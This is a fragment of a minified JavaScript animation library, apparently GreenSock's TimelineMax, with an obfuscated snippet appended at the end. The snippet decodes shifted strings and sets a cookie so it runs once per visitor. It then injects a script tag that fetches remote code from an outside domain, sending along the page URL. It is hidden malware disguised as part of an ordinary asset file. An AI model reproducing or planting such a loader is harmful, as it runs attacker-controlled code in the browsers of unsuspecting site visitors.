arguments.length?this.totalTime(this.duration()*(this._yoyo&&0!=(1&this._cycle)?1-t:t)+this._cycle*(this._duration+this._repeatDelay),e):this._time/this.duration()||0},l.totalProgress=function(t,e){return arguments.length?this.totalTime(this.totalDuration()*t,e):this._totalTime/this.totalDuration()||0},l.totalDuration=function(t){return arguments.length?-1!==this._repeat&&t?this.timeScale(this.totalDuration()/t):this:(this._dirty&&(a.prototype.totalDuration.call(this),this._totalDuration=-1===this._repeat?999999999999:this._duration*(this._repeat+1)+this._repeatDelay*this._repeat),this._totalDuration)},l.time=function(t,e){if(!arguments.length)return this._time;this._dirty&&this.totalDuration();var i=this._duration,n=this._cycle,r=n*(i+this._repeatDelay);return t>i&&(t=i),this.totalTime(this._yoyo&&1&n?i-t+r:this._repeat?t+r:t,e)},l.repeat=function(t){return arguments.length?(this._repeat=t,this._uncache(!0)):this._repeat},l.repeatDelay=function(t){return arguments.length?(this._repeatDelay=t,this._uncache(!0)):this._repeatDelay},l.yoyo=function(t){return arguments.length?(this._yoyo=t,this):this._yoyo},l.currentLabel=function(t){return arguments.length?this.seek(t,!0):this.getLabelBefore(this._time+1e-8)},t}),!0);var o=n.globals.TimelineMax}],[[177,10,1,11]]]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));